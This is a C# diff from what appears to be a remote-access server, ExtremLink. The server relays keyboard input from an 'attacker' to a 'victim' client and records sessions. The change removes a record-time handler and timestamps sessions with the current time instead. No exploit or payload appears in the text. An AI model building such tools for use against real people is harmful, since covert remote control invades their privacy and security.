@@ -200,9 +200,6 @@ namespace ExtremLink_Server_v2.Classes
                     case "^":
                         this.HandleKeyboardMessages(data);
                         break;
-                    case "📹🕑":
-                        this.HandleSessionRecordTimeFunction(data);
-                        break;
                 }
             }
         }
@@ -236,8 +233,7 @@ namespace ExtremLink_Server_v2.Classes
             while (true)
             {
                 byte[] sessionByteArr = GetSession();
-                Log.LogInstance.AddMessage("A session was received!");
-                this.tempSession = new Session(this.tempSessionRecordedTime, this.attacker.User.UserName);
+                this.tempSession = new Session(DateTime.Now, this.attacker.User.UserName);
                 this.tempSession.VideoContent = sessionByteArr;
                 this.tempSession.UploadSessionToDatabase();
             }
@@ -373,20 +369,6 @@ namespace ExtremLink_Server_v2.Classes
             this.victim.SendTCPMessageToClient("⌨", data);
         }
 
-        // Handling attacker's sessions' record time function:
-        private void HandleSessionRecordTimeFunction(string data)
-        {
-            // Input: A string which represent the message of session's record time.
-            // Output: The function handle with the given message.
-
-            // Reading the data in json format
-            dynamic message = JsonConvert.DeserializeObject(data);
-
-            // Casting the data dynamic object to JObject
-            JObject jsonData = (JObject)message;
-
-            this.tempSessionRecordedTime = DateTime.Parse(message.RecordedTime);
-        }
 
 
         // Getting frames function:
